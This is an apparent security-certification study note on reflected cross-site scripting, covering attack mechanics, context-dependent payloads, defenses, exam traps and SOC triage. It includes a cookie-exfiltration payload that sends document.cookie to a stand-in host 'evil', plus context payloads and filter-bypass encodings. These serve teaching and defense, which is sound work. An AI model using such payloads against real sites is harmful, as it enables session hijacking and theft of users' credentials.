# RXSS — Reflected Cross-site Scripting

## What it is

In **Need for Speed**, when a cop pursuit kicks off, dispatch radios your description right back across the band — "blue Skyline, last seen heading north on Rosewood." That description didn't originate from dispatch's brain. It came from a cop who spotted you, got handed to dispatch unfiltered, and dispatch immediately broadcast it to every unit in the city. Whatever the spotter said, the whole map heard, in dispatch's authoritative voice. That's exactly what reflected XSS does — the attacker whispers a malicious payload into a URL parameter, the server immediately echoes it back into the response page, and the victim's browser executes it under the trusted site's authority.

**Reflected Cross-site Scripting (RXSS)** is a client-side injection flaw where attacker-controlled input is included in the immediate HTTP response without proper output encoding, causing the victim's browser to execute attacker-supplied JavaScript in the context of the vulnerable origin. Unlike [[Stored XSS]] (Persistent), the payload is not saved on the server — it lives in the crafted request URL or form submission. One request in, one weaponized response out, executed in the victim's session.

The three XSS families CompTIA tests:

| Type | Where payload lives | Trigger |
|---|---|---|
| **Reflected** | URL/form parameter, echoed in response | Victim clicks attacker's crafted link |
| **Stored (Persistent)** | Database, comment field, profile | Victim visits the infected page |
| **DOM-based** | Never touches the server — client-side JS sinks | Victim's browser parses bad fragment/hash |

RXSS is the most common because it requires no write access to the application. The attacker just needs a vulnerable parameter and a victim willing to click.

## Why it matters

XSS has lived on the OWASP Top 10 since the list existed. In the 2021 revision it folded into **A03: Injection** alongside SQL injection. The reason it never dies: every web app reflects user input somewhere — search results, error messages, "you entered X, did you mean Y?" — and every one of those reflections is a candidate sink.

Career-wise, this is the bread and butter of [[Web Application Security]] triage. You will see RXSS findings in every pentest report you ever read. You will argue with developers who think `htmlspecialchars()` on the input handles it (it doesn't, output context matters). You will tune WAF rules that block 90% of payloads and miss the one that mattered.

Exam-wise, **CS0-003 Objective 2.4** wants you to recommend controls. RXSS sits next to [[CSRF]], [[SQL Injection]], [[SSRF]], and [[LFI/RFI]] on the injection-flaws list — know how they differ, know the mitigation per class, and know why input validation alone is not the answer.

The real-world stakes: session hijacking, credential theft via fake login overlays, cryptocurrency wallet drainers injected into legitimate sites, and the ever-popular keylogger-in-a-browser. RXSS plus a phishing email is the credential-harvest combo that bypasses MFA when the payload steals the post-auth session cookie.

## Key facts

### How the attack actually fires

The mechanic, end to end:

1. Attacker finds a parameter the app echoes back unfiltered — `search.php?q=widgets` returns "Results for: widgets"
2. Attacker crafts a URL: `search.php?q=<script>fetch('https://evil/?c='+document.cookie)</script>`
3. Attacker delivers the URL via phishing, malvertising, forum post, QR code, shortened link
4. Victim clicks while authenticated to `bank.example.com`
5. Server reflects the payload into the response HTML
6. Victim's browser parses it as a script tag, executes it under `bank.example.com` origin
7. `document.cookie` ships to attacker's collector; session is now portable

The whole chain takes one click. No malware drop, no persistence on disk, no AV signature to hit.

### Output context determines the payload

A trap junior analysts walk into: thinking RXSS is just `<script>alert(1)</script>`. The payload must match the **output context** — where in the HTML the reflection lands:

| Context | Example sink | Payload shape |
|---|---|---|
| HTML body | `<div>USER</div>` | `<script>...</script>` or `<img src=x onerror=...>` |
| HTML attribute | `<input value="USER">` | `" onfocus=alert(1) autofocus="` |
| JavaScript string | `var name = "USER";` | `";alert(1);//` |
| URL attribute | `<a href="USER">` | `javascript:alert(1)` |
| CSS | `<style>body{color:USER}</style>` | `red;}body{background:url(...)` |

This is why "we filter `<script>`" is not a defense. The attacker doesn't need a script tag if they're already inside a JavaScript string sink.

### Defenses, in order of effectiveness

**Context-aware output encoding** is the primary defense. Encode at the moment of output, based on where the data is going:
- HTML body → HTML entity encode (`<` becomes `&lt;`)
- HTML attribute → attribute encode (quote everything, encode quotes)
- JavaScript → JS string escape (`\x3c` for `<`)
- URL → URL encode

**Content Security Policy (CSP)** is the seatbelt. A strict CSP (`script-src 'self'; object-src 'none'; base-uri 'none'`) blocks inline scripts even if the attacker injects them. CSP with `'unsafe-inline'` is theater — it allows exactly what you're trying to block.

**HttpOnly cookies** keep session tokens out of `document.cookie`. RXSS can still phish or keylog, but session theft via cookie read is dead.

**SameSite cookies** (Lax or Strict) prevent the stolen cookie from being useful cross-site, and reduce [[CSRF]] surface as a bonus.

**Input validation** is defense-in-depth, not the primary control. Allowlist what's expected (digits only, UUID format, enum values). Never rely on a denylist of "bad characters" — encoding bypasses (`%3Cscript%3E`, `&#x3c;script&#x3e;`, `<scr<script>ipt>`) will eat your lunch.

**X-XSS-Protection** header is deprecated. Modern browsers ignore it. Don't recommend it on the exam or in real life. CSP replaced it.

**WAF rules** catch low-effort payloads. They will not catch a context-aware attacker. Use as a speed bump, not a wall.

### RXSS vs the rest of the injection family

CompTIA Objective 2.4 lumps these together. Know the differences:

| Vulnerability | Sink | Executes where |
|---|---|---|
| **RXSS** | HTML/JS response | Victim's browser |
| **Stored XSS** | DB → HTML response | Victim's browser (persistent) |
| **SQL Injection** | DB query | Database engine |
| **CSRF** | Authenticated request | Victim's session, on attacker's behalf |
| **SSRF** | Outbound server request | Server's network position |
| **LFI/RFI** | File include path | Server filesystem / remote URL |
| **RCE** | Code interpreter | Server (worst case) |

XSS does not run on the server. That fact alone kills several wrong CompTIA answers.

### CompTIA exam traps

> **Trap 1:** Reflected vs Stored vs DOM. If the question says "the payload is included in the email link the user clicks" — that's reflected. If it says "the attacker posted a comment that fires for every visitor" — stored. If it says "the application's client-side JavaScript reads `location.hash` and writes to `innerHTML`" — DOM-based. CompTIA loves swapping these.

> **Trap 2:** "Input validation will prevent XSS." Input validation helps, but the canonical defense is **output encoding** in the correct context. CompTIA accepts both as valid controls, but if both options appear, pick output encoding for XSS specifically. Input validation is the right answer for SQLi and command injection.

> **Trap 3:** XSS vs CSRF. XSS executes attacker code in the victim's browser; CSRF rides the victim's existing session to perform an action. The mitigations are different — CSP/encoding for XSS, anti-CSRF tokens and SameSite cookies for CSRF. A site can be vulnerable to both, neither, or one and not the other.

> **Trap 4:** HttpOnly does not prevent XSS. It prevents one *consequence* of XSS — session cookie theft via JavaScript. The script still runs. Phishing overlays, keyloggers, and request forgery from the victim's session still work.

## SOC reality

- **The alert at 3am:** WAF logs a burst of `%3Cscript%3E` patterns against `/search` from a single source IP. You check — 90% are scanner noise (`Nessus`, `Acunetix`, bug bounty hunter). The 10% that matters is the one from a residential IP with a referer from a phishing domain you've never seen.
- **First action for L1:** Pull the full request, decode the payload, check if it would actually fire (is the parameter reflected? in what context? is CSP in place?). Pivot to web access logs — did any internal user click the link? Did the parameter get hit with a 200 response to a real browser User-Agent?
- **What the IR lead asks:** "Did anyone authenticated click it? What's the session lifetime on the cookie? Is HttpOnly set? Do we have CSP logs showing blocked execution?" The CSP report-uri is gold here — it tells you exactly what fired and got blocked in real users' browsers.
- **What never to promise:** "It's just reflected, not stored, so we're fine." Reflected XSS combined with a phishing campaign targeting your help desk is how attackers get into admin consoles. Severity is contextual — what does the vulnerable page do, and who uses it?
- **The handoff:** L1 confirms exploitability and scope of clicks → L2 hunts for successful exploitation (anomalous session usage, impossible-travel logins on victim accounts, cookie reuse from new IPs) → AppSec gets the bug filed with proof-of-concept → IR opens a case if there's any indication a real user fired the payload while authenticated.

*The most expensive XSS I ever triaged was a "low severity" reflected finding in a marketing microsite. The microsite shared a session cookie domain with the SSO portal. One phished admin click, one stolen session, two weeks of dwell time.*

## Related concepts

[[Stored XSS]] · [[DOM-based XSS]] · [[CSRF]] · [[SQL Injection]] · [[SSRF]] · [[LFI/RFI]] · [[Content Security Policy]] · [[OWASP Top 10]] · [[Input Validation]] · [[Output Encoding]] · [[Session Hijacking]] · [[HttpOnly Cookies]] · [[SameSite Cookies]] · [[Web Application Firewall]] · [[Phishing]] · [[Injection Flaws]] · [[Insecure Design]]

*Source: VIRGIL knowledge base — 2026-05-11*